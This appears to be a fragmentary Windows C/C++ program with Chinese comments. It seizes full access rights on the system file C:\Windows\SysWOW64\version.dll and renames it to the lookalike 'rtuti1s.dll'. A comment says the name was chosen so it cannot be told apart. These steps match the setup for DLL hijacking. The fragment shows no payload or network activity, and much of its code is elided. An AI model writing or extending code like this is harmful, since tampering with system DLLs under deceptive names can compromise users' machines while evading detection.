    ...
    DWORD dwAccessMask)
{
    ...
    __try {
        ...
        // 
        // STEP 20: 把新的SD设置设置到文件的安全属性中（千山万水啊，终于到了） //这一步设置出错.
        // 
...
int _tmain(int argc, TCHAR *argv[]) {
    ...
    CProcessOpt psOpt;
    TCHAR szFileName[] = TEXT("C:\\Windows\\SysWOW64\\version.dll");
    TCHAR szGroubName[] = TEXT("Administrators");
    if (!AddAccessRights(szFileName,szGroubName, GENERIC_ALL)) {
        _tprintf(TEXT("\nAddAccessRights() failed./n"));
        return 1;
    }
    else {
        _tprintf(TEXT("\nAddAccessRights() succeeded./n"));
       
    }

    //打开其文件.修改其文件名.然后写入到C盘.
    //CopyFile(TEXT("C:\\Windows\\SysWOW64\\version.dll"), TEXT("C:\\Windows\\SysWOW64\\version11.dll"),FALSE ); //FALSE为覆盖
    /*
    修改其文件名
    */
...
#ifdef _WIN32
    oldName = "C:\\Windows\\SysWOW64\\version.dll";
    newName = "C:\\Windows\\SysWOW64\\rtuti1s.dll";   //加上1让其辨别不清
#else
    oldName = "C:\\Windows\\System32\\version.dll";
    newName = "C:\\Windows\\System32\\rtuti1s.dll";
#endif
